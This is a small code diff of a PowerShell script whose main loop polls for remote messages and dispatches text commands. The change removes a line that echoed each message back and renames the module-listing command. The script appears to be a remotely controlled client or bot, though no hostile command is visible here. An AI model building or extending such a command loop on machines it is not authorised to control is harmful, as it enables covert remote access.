@@ -1632,7 +1632,6 @@ GetFfmpeg
 # =============================== MAIN LOOP ===============================
 while ($true) {
     $latestMessage = PullMsg
-    sendMsg -Message $latestMessage
     $currentTime = Get-Date
     if (($currentTime - $global:lastJobCheck).TotalSeconds -ge 2) {
         Check_CompletedJobs
@@ -1657,7 +1656,7 @@ while ($true) {
                 }
             }
             #Technically the same as COMMANDS hence COMMANDS is gone
-            'VIEWMODULES' { List_Modules }
+            'MODULES' { List_Modules }
             #THEMES
             'GETTHEME' { GetCurrentTheme }
             'ENABLETHEME' { EnableTheme }
